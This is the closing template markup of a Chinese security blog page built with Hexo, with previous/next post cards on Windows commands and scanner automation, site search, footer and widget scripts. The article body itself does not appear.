</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="far fa-dot-circle"></i>&nbsp;本篇
            </div>
            <div class="card">
                <a href="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="windows常用命令">
                        
                        <span class="card-title">windows常用命令</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-23
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/windows%E5%91%BD%E4%BB%A4/" class="post-category">
                                    windows命令
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/windows/">
                        <span class="chip bg-color">windows</span>
                    </a>
                    
                    <a href="/tags/%E5%91%BD%E4%BB%A4/">
                        <span class="chip bg-color">命令</span>
                    </a>
                    
                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                        <span class="chip bg-color">信息收集</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="crawlergo-to-xray(server酱推送微信)">
                        
                        <span class="card-title">crawlergo-to-xray(server酱推送微信)</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category">
                                    安全
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E6%B8%97%E9%80%8F/">
                        <span class="chip bg-color">渗透</span>
                    </a>
                    
                    <a href="/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/">
                        <span class="chip bg-color">扫描器</span>
                    </a>
                    
                    <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/">
                        <span class="chip bg-color">自动化</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="3537362132"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021</span>
            
            <span id="year">2021</span>
            <a href="/about" target="_blank">leaves</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/GreenLeavesl" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>















    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    
        
    <!-- 雪花特效 --> 
     
    <script type="text/javascript" src="/libs/others/snow.js"></script> 
    

    <!--浏览器搞笑标题-->
    <script type="text/javascript" src="/js/FunnyTitle.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>

</html>
